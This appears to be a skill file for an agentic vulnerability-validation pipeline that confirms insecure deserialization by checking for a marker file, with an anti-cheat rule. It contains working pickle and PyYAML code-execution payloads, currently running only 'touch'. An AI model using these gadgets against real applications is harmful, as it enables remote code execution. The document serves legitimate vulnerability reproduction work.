---
name: validate-insecure-deserialization
description: Validate insecure deserialization by verifying that malicious serialized data creates /tmp/deserialized_flag during the deserialization process. Anti-cheat ensures the file is created by deserialization, not the PoC script.
origin: vuln-analysis
---

# Validator: Insecure Deserialization

Confirm whether a vulnerability allows code execution through malicious serialized objects, verified by the creation of `/tmp/deserialized_flag`.

## When to Activate

- An insecure deserialization vulnerability needs validation during reproduction (Step 5/7)

## Prerequisites (set up before PoC execution)

```bash
# Clean up any existing marker file
docker exec <container> rm -f /tmp/deserialized_flag
```

## Supported Formats

| Language | Format | Gadget Target |
|----------|--------|---------------|
| Python | `pickle`, `PyYAML` (unsafe load), `shelve` | `touch /tmp/deserialized_flag` |
| Java | `ObjectInputStream`, XML deserialization | `touch /tmp/deserialized_flag` |
| PHP | `unserialize()` | `touch /tmp/deserialized_flag` |
| Ruby | `Marshal.load()` | `touch /tmp/deserialized_flag` |

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[SUCCESS]** | `/tmp/deserialized_flag` file exists after PoC execution AND legitimacy check passes |
| **[FAILED]** | `/tmp/deserialized_flag` does not exist after timeout |
| **[INVALID]** | PoC script directly creates `/tmp/deserialized_flag` |

## Attack Vector Examples

The PoC must craft a malicious serialized payload that, when deserialized by the target application, creates the marker file:

**Python pickle:**
```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('touch /tmp/deserialized_flag',))

payload = pickle.dumps(Exploit())
# Send payload to the target app's deserialization endpoint
requests.post(target_url, data=payload, headers={"Content-Type": "application/octet-stream"})
```

**Python YAML:**
```python
payload = '!!python/object/apply:os.system ["touch /tmp/deserialized_flag"]'
requests.post(target_url, data=payload, headers={"Content-Type": "application/x-yaml"})
```

## Legitimacy Check (Anti-Cheat)

Scan the PoC script source code. The result is `[INVALID]` if:

- `touch /tmp/deserialized_flag` is executed directly by the PoC (not inside a serialized payload)
- `open('/tmp/deserialized_flag', 'w')` or equivalent file creation in PoC logic
- `os.system('touch ...')` called directly (not inside a `__reduce__` or gadget chain)

**Rule**: The marker file must be created by the **deserialization execution chain** inside the target application, not by the PoC script directly.

Example:
- VALID: `pickle.dumps(Exploit())` where `Exploit.__reduce__` returns `(os.system, ('touch /tmp/deserialized_flag',))` — the command runs during deserialization on the server
- INVALID: `os.system('touch /tmp/deserialized_flag')` called directly in the PoC

## Verification

```bash
# Poll for marker file (check multiple times with delay)
for i in 1 2 3 4 5; do
  docker exec <container> test -f /tmp/deserialized_flag && echo "[SUCCESS]" && exit 0
  sleep 2
done
echo "[FAILED]"
```

## Confidence Scoring (1-10)

| Score | Scenario |
|-------|----------|
| 9-10 | Marker file created via deserialization gadget, code execution proven |
| 7-8 | Deserialization with observable side-effects (timing, error differences) |
| 4-6 | Endpoint accepts serialized data but no execution evidence |
| 1-3 | Endpoint rejects or safely handles serialized input |

**Threshold: Only mark [SUCCESS] if `/tmp/deserialized_flag` exists AND legitimacy check passed**
